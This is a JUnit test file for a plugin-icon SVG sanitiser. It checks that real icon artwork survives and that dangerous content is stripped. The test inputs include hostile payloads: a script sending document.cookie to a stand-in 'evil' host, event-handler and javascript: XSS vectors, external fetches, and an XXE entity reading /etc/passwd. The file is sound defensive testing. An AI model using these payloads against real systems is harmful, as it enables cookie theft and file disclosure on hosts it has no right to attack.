package com.orchpilot.workflow.plugin.icon;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * What survives sanitising a plugin's SVG, and what does not.
 *
 * <p>Every removal test names something an SVG can genuinely do. The keep tests matter just as much: a
 * sanitiser that strips the artwork down to nothing is a sanitiser nobody will leave switched on.
 */
class SvgSanitizerTest {

    private static String sanitize(String svg) {
        return new String(SvgSanitizer.sanitize(svg.getBytes(StandardCharsets.UTF_8)).svg(),
                StandardCharsets.UTF_8);
    }

    private static SvgSanitizer.Result result(String svg) {
        return SvgSanitizer.sanitize(svg.getBytes(StandardCharsets.UTF_8));
    }

    /** The icon actually shipped in the GCP Compute Instance plugin. */
    private static final String COMPUTE_ENGINE = """
            <svg xmlns="http://www.w3.org/2000/svg" width="24px" height="24px" viewBox="0 0 24 24">\
            <defs><style>.cls-1{fill:#aecbfa;}.cls-2{fill:#669df6;}.cls-3{fill:#4285f4;}</style></defs>\
            <title>Icon_24px_ComputeEngine_Color</title><g data-name="Product Icons">\
            <rect class="cls-1" x="9" y="9" width="6" height="6"/>\
            <rect class="cls-2" x="11" y="2" width="2" height="4"/>\
            <rect class="cls-3" x="19" y="10" width="2" height="4" transform="translate(8 32) rotate(-90)"/>\
            <path class="cls-1" d="M5,5V19H19V5ZM17,17H7V7H17Z"/>\
            <polygon class="cls-2" points="9 15 15 15 12 12 9 15"/></g></svg>""";

    // ------------------------------------------------------------------ keeps the artwork

    @Test
    @DisplayName("keeps everything the real Compute Engine icon is made of")
    void keepsRealIcon() {
        String clean = sanitize(COMPUTE_ENGINE);

        assertThat(clean).contains("<style>").contains("fill:#aecbfa");
        assertThat(clean).contains("<rect").contains("<path").contains("<polygon");
        assertThat(clean).contains("transform=\"translate(8 32) rotate(-90)\"");
        assertThat(clean).contains("viewBox=\"0 0 24 24\"");
        // class is how the inline stylesheet reaches the shapes; dropping it would render a blank icon.
        assertThat(clean).contains("class=\"cls-1\"");
    }

    @Test
    @DisplayName("keeps gradients, which many product marks use")
    void keepsGradients() {
        String clean = sanitize("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><defs>\
                <linearGradient id="g"><stop offset="0" stop-color="#fff"/>\
                <stop offset="1" stop-color="#000"/></linearGradient></defs>\
                <rect width="24" height="24" fill="url(#g)"/></svg>""");

        assertThat(clean).contains("linearGradient").contains("stop-color");
        // A same-document url(#…) is the whole point of a gradient and must survive.
        assertThat(clean).contains("url(#g)");
    }

    // ------------------------------------------------------------------ removes the dangerous parts

    @Test
    @DisplayName("removes a script element")
    void removesScript() {
        SvgSanitizer.Result result = result("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">\
                <script>fetch('https://evil/'+document.cookie)</script>\
                <rect width="24" height="24"/></svg>""");

        String clean = new String(result.svg(), StandardCharsets.UTF_8);
        assertThat(clean).doesNotContain("script").doesNotContain("evil");
        assertThat(clean).contains("<rect");
        assertThat(result.removed()).contains("<script>");
    }

    @Test
    @DisplayName("removes event handlers")
    void removesEventHandlers() {
        SvgSanitizer.Result result = result("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" onload="alert(1)">\
                <rect width="24" height="24" onclick="alert(2)" onmouseover="alert(3)"/></svg>""");

        String clean = new String(result.svg(), StandardCharsets.UTF_8);
        assertThat(clean).doesNotContain("onload").doesNotContain("onclick").doesNotContain("alert");
        assertThat(result.removed()).contains("onload", "onclick");
    }

    @Test
    @DisplayName("removes foreignObject, which smuggles HTML into an SVG")
    void removesForeignObject() {
        String clean = sanitize("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><foreignObject>\
                <body xmlns="http://www.w3.org/1999/xhtml"><img src="x" onerror="alert(1)"/></body>\
                </foreignObject><rect width="24" height="24"/></svg>""");

        assertThat(clean).doesNotContain("foreignObject").doesNotContain("onerror");
        assertThat(clean).contains("<rect");
    }

    @Test
    @DisplayName("removes an anchor with a javascript: target")
    void removesJavascriptLink() {
        String clean = sanitize("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">\
                <a href="javascript:alert(1)"><rect width="24" height="24"/></a></svg>""");

        assertThat(clean).doesNotContain("javascript:").doesNotContain("<a ");
    }

    @Test
    @DisplayName("removes an external image reference")
    void removesExternalImage() {
        String clean = sanitize("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">\
                <image href="https://tracker.example/pixel.png" width="1" height="1"/>\
                <rect width="24" height="24"/></svg>""");

        // Not just script: an external fetch on render is a callback that says who opened the designer.
        assertThat(clean).doesNotContain("tracker.example").doesNotContain("<image");
    }

    @Test
    @DisplayName("removes a stylesheet that imports from elsewhere")
    void removesImportingStyle() {
        SvgSanitizer.Result result = result("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">\
                <style>@import url('https://evil/x.css');</style><rect width="24" height="24"/></svg>""");

        String clean = new String(result.svg(), StandardCharsets.UTF_8);
        assertThat(clean).doesNotContain("@import").doesNotContain("evil");
        assertThat(clean).contains("<rect");
    }

    @Test
    @DisplayName("removes a fill that points outside the document")
    void removesExternalFill() {
        String clean = sanitize("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">\
                <rect width="24" height="24" fill="url(https://evil/x#g)"/></svg>""");

        assertThat(clean).doesNotContain("evil");
    }

    @Test
    @DisplayName("removes animation elements, which can drive attributes over time")
    void removesAnimation() {
        String clean = sanitize("""
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><rect width="24" height="24">\
                <animate attributeName="fill" values="red;blue" dur="1s"/></rect></svg>""");

        assertThat(clean).doesNotContain("<animate");
    }

    // ------------------------------------------------------------------ parsing

    @Test
    @DisplayName("refuses an external entity rather than resolving it")
    void refusesExternalEntities() {
        // Left unguarded this reads a file off the engine host and embeds it in the icon.
        assertThatThrownBy(() -> sanitize("""
                <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><text>&xxe;</text></svg>"""))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("refuses a file whose root is not <svg>")
    void refusesNonSvgRoot() {
        assertThatThrownBy(() -> sanitize("<html><body>hello</body></html>"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("refuses bytes that are not XML at all")
    void refusesGarbage() {
        assertThatThrownBy(() -> sanitize("this is not markup"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("not valid SVG");
    }

    // ------------------------------------------------------------------ scaling

    @Test
    @DisplayName("derives a viewBox when the icon has only width and height")
    void derivesViewBox() {
        SvgSanitizer.Result result = result(
                "<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"48px\" height=\"48px\">"
                        + "<rect width=\"48\" height=\"48\"/></svg>");

        // Without one the icon renders at its intrinsic size and is cropped in a 40px tile.
        assertThat(new String(result.svg(), StandardCharsets.UTF_8)).contains("viewBox=\"0 0 48 48\"");
    }

    @Test
    @DisplayName("reports a clean file as clean")
    void reportsClean() {
        assertThat(result(COMPUTE_ENGINE).isClean()).isTrue();
    }
}
